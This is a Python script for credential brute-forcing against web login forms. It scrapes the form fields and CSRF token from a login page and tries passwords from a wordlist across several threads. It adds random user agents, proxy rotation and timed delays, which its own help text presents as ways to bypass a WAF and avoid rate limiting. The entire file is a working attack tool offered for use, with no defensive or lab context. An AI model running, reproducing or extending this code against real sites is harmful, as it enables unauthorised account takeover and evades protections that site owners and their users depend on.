import argparse
import requests
import threading
import time
import random
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from itertools import cycle

# Function to parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Advanced HTTP/HTTPS Brute Force Login with WAF Bypass")
    parser.add_argument("-l", "--username", required=True, help="Username to use for login attempts")
    parser.add_argument("-u", "--url", required=True, help="URL of the login page (e.g., http://example.com/login)")
    parser.add_argument("--redirect", required=True, help="URL to redirect to, indicating a successful login")
    parser.add_argument("wordlist", help="Path to the wordlist file containing passwords")
    parser.add_argument("--threads", type=int, default=1, help="Number of threads to use (default: 1)")
    parser.add_argument("--random-agent", action="store_true", help="Use a random user agent for each request")
    parser.add_argument("--proxy-list", help="Path to a list of proxies for rotating IPs")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests (in seconds) to avoid rate limiting")
    return parser.parse_args()

# Function to get a random proxy from the list
def get_random_proxy(proxy_list_file):
    with open(proxy_list_file, 'r') as f:
        proxies = f.readlines()
    proxy = random.choice(proxies).strip()
    return {"http": f"http://{proxy}", "https": f"https://{proxy}"}

# Function to extract the form and CSRF token from the login page
def get_login_form_details(url):
    session = requests.Session()
    response = session.get(url)

    if response.status_code != 200:
        print("Failed to retrieve the login page.")
        return None, None, None, None, None

    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form')
    if not form:
        print("No form found on the login page.")
        return None, None, None, None, None

    action_url = form.get('action', url)  # Default to the current URL if no action attribute is present
    action_url = urljoin(url, action_url)  # Ensure it's an absolute URL
    method = form.get('method', 'POST').upper()

    username_field, password_field, csrf_token = None, None, None
    for input_tag in form.find_all('input'):
        input_name = input_tag.get('name', '').lower()
        if 'user' in input_name or 'login' in input_name:
            username_field = input_name
        elif 'pass' in input_name or 'password' in input_name:
            password_field = input_name
        if 'csrf' in input_name:
            csrf_token = input_tag.get('value', '')

    return action_url, method, username_field, password_field, csrf_token

# Brute-force function for a single password
def attempt_login(session, action_url, method, username_field, password_field, csrf_token, username, password, headers, redirect_url, proxy=None):
    payload = {
        username_field: username,
        password_field: password
    }
    if csrf_token:
        payload['csrf_token'] = csrf_token

    try:
        if method == 'POST':
            response = session.post(action_url, data=payload, headers=headers, proxies=proxy, allow_redirects=True)
        else:
            response = session.get(action_url, params=payload, headers=headers, proxies=proxy, allow_redirects=True)

        if response.url == redirect_url:
            print(f"[SUCCESS] Login successful with password: {password}")
            return True
        else:
            print(f"[FAILURE] Username: {username}, Password: {password}")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request error: {e}")

    return False

# Thread worker
def worker(username, url, redirect_url, wordlist, headers, action_url, method, username_field, password_field, csrf_token, proxies=None, delay=0.5):
    session = requests.Session()
    proxy_cycle = cycle(proxies) if proxies else None
    for password in wordlist:
        proxy = next(proxy_cycle, None)  # Get the next proxy (if proxies are used)
        success = attempt_login(session, action_url, method, username_field, password_field, csrf_token, username, password, headers, redirect_url, proxy)
        if success:
            break
        time.sleep(random.uniform(0.5, delay))  # Random delay between requests to avoid rate limiting

# Main function to execute the script
def main():
    args = parse_arguments()

    with open(args.wordlist, 'r') as wordlist_file:
        passwords = [line.strip() for line in wordlist_file]

    action_url, method, username_field, password_field, csrf_token = get_login_form_details(args.url)
    if not action_url:
        return

    # Use fake user-agent if --random-agent is specified
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    if args.random_agent:
        ua = UserAgent()
        headers["User-Agent"] = ua.random  # Random user agent for each request
    else:
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

    # Load proxies if specified
    proxies = None
    if args.proxy_list:
        proxies = [get_random_proxy(args.proxy_list)]

    threads = []
    chunk_size = len(passwords) // args.threads
    for i in range(args.threads):
        start = i * chunk_size
        end = start + chunk_size if i < args.threads - 1 else len(passwords)
        thread = threading.Thread(target=worker, args=(
            args.username, args.url, args.redirect, passwords[start:end], headers,
            action_url, method, username_field, password_field, csrf_token, proxies, args.delay
        ))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
